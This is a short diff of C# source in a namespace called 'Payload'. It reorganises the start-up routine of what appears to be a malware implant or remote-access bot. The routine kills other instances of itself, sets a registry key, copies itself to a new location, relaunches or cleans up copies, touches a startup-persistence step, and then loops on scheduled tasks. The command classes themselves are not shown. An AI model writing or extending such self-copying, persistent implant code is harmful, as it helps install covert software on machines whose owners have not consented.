@@ -28,24 +28,26 @@ namespace Payload
                 TextHelper.WriteError(e.StackTrace);
             }
         }
-        
-        static void Run()
+        static void OnRelease()
         {
-
-            new KillOtherMeCommand().Execute();
-
+            if (!Config.IsRelease())
+                return;
             new RegistryKeyCommand().Execute();
-
             if (new CopyItselfCommand().Execute() == null)
                 new StartProcessFactory().CreateCommand().Execute();
             else
+            {
                 new ClearOtherPatchCommand().Execute();
-            
+                //new StartupSetupCommand().Execute();
+            }
+        }
 
-            new StartupSetupCommand().Execute();
-
+        
+        static void Run()
+        {
+            new KillOtherMeCommand().Execute();
+            OnRelease();
             new ConsoleLogCommand().Execute<String>($"Task Interval : {TextHelper.GenTimeSpanFromMillisec(Config.Instance.MainSleepInterval)}");
-
             Command.CommandManager.Instance.RegisterTask();
 
             while (true)
